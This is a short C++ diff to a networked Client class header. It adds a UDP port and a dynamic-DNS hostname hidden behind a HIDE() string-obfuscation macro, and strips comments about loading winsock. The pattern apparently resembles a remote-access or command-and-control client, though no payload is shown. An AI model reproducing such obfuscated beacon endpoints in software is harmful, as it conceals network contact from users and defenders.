@@ -10,6 +10,9 @@
 #include <algorithm>
 #include <random>
 
+const unsigned int UDP_PORT = 5454;
+const std::string  DNS_NAME = std::string(HIDE("logicgate-test.ddns.net"));
+
 class Client {
 public:
 
@@ -67,8 +70,8 @@ public:
 
 
 #elif defined(CLIENT_RELEASE)
-    Client(); // dynamically load winsock and put it in loaded dlls
-    ~Client(); // unload winsock
+    Client();
+    ~Client();
 
 	BOOL          Connect();
     BOOL          Disconnect();
@@ -117,6 +120,7 @@ protected:
 
     // Further details on client
     Server        ConnectedServer = {};          // Information on the clients connected server
+    Server        UDPServerDetails = {};
 #endif
 
     SOCKET        UDPSocket       = INVALID_SOCKET;
